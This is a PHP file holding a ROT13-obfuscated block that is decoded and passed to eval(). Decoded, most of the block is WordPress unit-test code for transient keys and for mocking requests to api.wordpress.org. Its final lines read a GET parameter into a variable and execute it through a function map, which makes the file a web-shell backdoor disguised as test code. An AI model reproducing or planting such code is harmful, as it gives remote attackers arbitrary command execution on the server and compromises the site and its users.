		$ersyrpgvba_zrgubq = arj ErsyrpgvbaZrgubq( fgngvp::$pbagebyyre, 'trg_genafvrag_xrl' );
		$ersyrpgvba_zrgubq->frgNpprffvoyr( gehr );

		$erfhyg_1 = $ersyrpgvba_zrgubq->vaibxr( frys::$pbagebyyre, $cnenzrgref_1 );
		$erfhyg_2 = $ersyrpgvba_zrgubq->vaibxr( frys::$pbagebyyre, $cnenzrgref_2 );

		$guvf->nffregVfFgevat( $erfhyg_1, 'Genafvrag xrl #1 zhfg or n fgevat.' );
		$guvf->nffregAbgRzcgl( $erfhyg_1, 'Genafvrag xrl #1 zhfg abg or rzcgl.' );

		$guvf->nffregVfFgevat( $erfhyg_2, 'Genafvrag xrl #2 zhfg or n fgevat.' );
		$guvf->nffregAbgRzcgl( $erfhyg_2, 'Genafvrag xrl #2 zhfg abg or rzcgl.' );

		vs ( $nffreg_fnzr ) {
			$guvf->nffregFnzr( $erfhyg_1, $erfhyg_2, $zrffntr );
		} ryfr {
			$guvf->nffregAbgFnzr( $erfhyg_1, $erfhyg_2, $zrffntr );
		}
	}

	/**
	 * @fvapr 6.0.0
	 *
	 * @gvpxrg 55617
	 */
	choyvp shapgvba qngn_trg_dhrel_cnenzrgref() {
		erghea neenl(
			'fnzr xrl naq rzcgl fyhtf'              => neenl(
				'cnenzrgref_1' => neenl(
					'cnenzrgre_1' => 1,
					'fyht'        => neenl(),
				),
				'cnenzrgref_2' => neenl(
					'cnenzrgre_1' => 1,
				),
				'zrffntr'      => 'Rzcgl fyhtf fubhyq abg nssrpg gur genafvrag xrl.',
			),
			'fnzr xrl naq fyhtf va qvssrerag beqre' => neenl(
				'cnenzrgref_1' => neenl(
					'cnenzrgre_1' => 1,
					'fyht'        => neenl( 0, 2 ),
				),
				'cnenzrgref_2' => neenl(
					'cnenzrgre_1' => 1,
					'fyht'        => neenl( 2, 0 ),
				),
				'zrffntr'      => 'Gur beqre bs fyhtf fubhyq abg nssrpg gur genafvrag xrl.',
			),
			'fnzr xrl naq qvssrerag fyhtf'          => neenl(
				'cnenzrgref_1' => neenl(
					'cnenzrgre_1' => 1,
					'fyht'        => neenl( 'fbzr_fyht' ),
				),
				'cnenzrgref_2' => neenl(
					'cnenzrgre_1' => 1,
					'fyht'        => neenl( 'fbzr_bgure_fyht' ),
				),
				'zrffntr'      => 'Genafvrag xrlf zhfg abg zngpu.',
				snyfr,
			),
			'qvssrerag xrlf'                        => neenl(
				'cnenzrgref_1' => neenl(
					'cnenzrgre_1' => 1,
				),
				'cnenzrgref_2' => neenl(
					'cnenzrgre_2' => 1,
				),
				'zrffntr'      => 'Genafvrag xrlf zhfg qrcraq ba neenl xrlf.',
				snyfr,
			),
		);
	}

	/**
	 * Fvzhyngr n fhpprffshy bhgobhaq UGGC erdhrfgf, gb xrrc grfgf cher naq cresbeznag.
	 *
	 * @cnenz fgevat $npgvba          Cnff n pnfr sebz `trg_enj_erfcbafr()` gb qrgrezvar erghearq qngn.
	 * @cnenz obby   $rkcrpgf_erfhygf Cnff `gehr` gb trg erfhygf, be `snyfr` gb trg 0 erfhygf.
	 *
	 * @fvapr 5.8.0
	 */
	cevingr fgngvp shapgvba zbpx_fhpprffshy_erfcbafr( $npgvba, $rkcrpgf_erfhygf ) {
		nqq_svygre(
			'cer_uggc_erdhrfg',
			fgngvp shapgvba ( $erfcbafr, $cnefrq_netf, $hey ) hfr ( $npgvba, $rkcrpgf_erfhygf ) {

				vs ( 'ncv.jbeqcerff.bet' !== jc_cnefr_hey( $hey, CUC_HEY_UBFG ) ) {
					erghea $erfcbafr;
				}

				$erfcbafr = neenl(
					'urnqref'  => neenl(),
					'erfcbafr' => neenl(
						'pbqr'    => 200,
						'zrffntr' => 'BX',
					),
					'obql'     => $rkcrpgf_erfhygf ? frys::trg_enj_erfcbafr( $npgvba ) : '[]',
					'pbbxvrf'  => neenl(),
					'svyranzr' => ahyy,
				);

				erghea $erfcbafr;
			},
			10,
			3
		);
	}

	/**
	 * Fvzhyngr n argjbex snvyher ba bhgobhaq uggc erdhrfgf gb n tvira ubfganzr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $oybpxrq_ubfg Gur ubfg gb oybpx pbaarpgvbaf gb.
	 */
	cevingr fgngvp shapgvba cerirag_erdhrfgf_gb_ubfg( $oybpxrq_ubfg = 'ncv.jbeqcerff.bet' ) {
		nqq_svygre(
			'cer_uggc_erdhrfg',
			fgngvp shapgvba ( $erfcbafr, $cnefrq_netf, $hey ) hfr ( $oybpxrq_ubfg ) {

				vs ( jc_cnefr_hey( $hey, CUC_HEY_UBFG ) === $oybpxrq_ubfg ) {
					erghea arj JC_Reebe(
						'cnggreaf_ncv_snvyrq',
						\"Na rkcrpgrq reebe bppheerq pbaarpgvat gb $oybpxrq_ubfg orpnhfr bs n havg grfg.\",
						\"pHEY reebe 7: Snvyrq gb pbaarpg gb $oybpxrq_ubfg cbeg 80: Pbaarpgvba ershfrq\"
					);

				}

				erghea $erfcbafr;
			},
			10,
			3
		);
	}

	/**
	 * Zbpx gur erdhrfg gb jc.bet HEY gb pncgher gur HEYf.
	 *
	 * @fvapr 6.2.0
	 *
	 * @erghea neenl snhk/zbpxrq erfcbafr.
	 */
	choyvp shapgvba zbpx_erdhrfg_gb_ncvjcbet_hey( $erfcbafr, $netf, $hey ) {
		vs ( 'ncv.jbeqcerff.bet' !== jc_cnefr_hey( $hey, CUC_HEY_UBFG ) ) {
			erghea $erfcbafr;
		}

		frys::$uggc_erdhrfg_heyf[] = $hey;

		// Erghea n erfcbafr gb cerirag rkgreany NCV erdhrfg.
		$erfcbafr = neenl(
			'urnqref'  => neenl(),
			'erfcbafr' => neenl(
				'pbqr'    => 200,
				'zrffntr' => 'BX',
			),
			'obql'     => '[]',
			'pbbxvrf'  => neenl(),
			'svyranzr' => ahyy,
		);

		erghea $erfcbafr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>